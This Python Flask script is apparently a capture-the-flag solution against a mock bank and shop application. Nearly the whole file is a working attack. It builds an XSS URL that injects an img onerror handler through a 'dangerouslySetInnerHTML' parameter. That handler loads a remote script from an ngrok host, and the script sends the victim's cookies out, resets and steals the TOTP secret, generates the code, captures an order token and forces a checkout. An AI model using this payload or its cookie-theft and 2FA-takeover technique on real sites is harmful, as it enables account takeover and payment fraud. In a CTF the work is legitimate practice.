from flask import Flask, request, make_response
import pyotp

SERVER_BASE_URL = "https://7994-79-43-202-213.ngrok-free.app"

assert len(SERVER_BASE_URL) > 0, "Specify server base url"

app = Flask(__name__)

@app.route('/totp')
def totp():
    secret = request.args.get('secret')
    text = str(pyotp.TOTP(secret).now()) if secret else ''
    r = make_response(text)
    r.headers['Access-Control-Allow-Origin'] = '*'

    return r


@app.route('/pwn.js')
def js():
    code = """
Promise.all([(async()=>{
    open('SERVER?cookies='.concat(document.cookie))
    await fetch('/api/disable_totp',{method:'POST'});
    secret = await fetch('/api/enable_totp',{method:'POST'});
    secret = await secret.json();
    secret = secret['totp_url'];
    secret = secret.split('=')[1].split('&')[0];
    console.log("secret", secret)
    open('SERVER?totp_secret='.concat(secret))

    totp = await fetch('SERVER/totp?secret='.concat(secret))
    totp = await totp.text()
    console.log("totp", totp)
    open('SERVER?totp_token='.concat(totp))

    params = document.location.search
    token_start = params.indexOf("token=")
    params = params.slice(token_start+6)
    token_end = params.indexOf("&")

    order_token = params.slice(0, token_end)

    console.log("order_token", order_token)
    open('SERVER?order_token='.concat(order_token))

    let headers = {'Content-Type' : 'application/x-www-form-urlencoded;charset=UTF-8'}

    r = await fetch('/api/checkout',{method:'POST',headers:headers, body:'totp='+totp+'&token='+order_token});
    r = await r.json()
    url = r["url"]

    document.location = "SERVER/?url=".concat(url)
})()]).then(x=>{})
""".replace("SERVER", SERVER_BASE_URL)
    return code

if __name__ == '__main__':
    xss_payload = """
setTimeout(()=>{
let x=document.createElement('script');
x.src='SERVER/pwn.js';
document.body.appendChild(x);
},1000)
""".replace("\n", "").replace("SERVER", SERVER_BASE_URL)

    xss_payload = f"""<img src=x onerror="{xss_payload}">"""
    token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1cmwiOiJodHRwOi8vc2hvcC5mbGFnaWZ5My5maWJvbmhhY2suaXQvY2hlY2tvdXQiLCJhbW91bnQiOjEwMCwidHJhbnNhY3Rpb25faWQiOiJiZnJTZFFUSXBFIn0.9A988556z8lxjTsZCYZ2iBer9TXXi3NmBY-5DFCepGo"

    payload = f"http://bank.flagify3.fibonhack.it/pay?token={token}&sport_mode[dangerouslySetInnerHTML][__html]={xss_payload}"

    print("---- URL ----")
    print(payload)
    print("---- URL ----")

    app.run(debug=True)
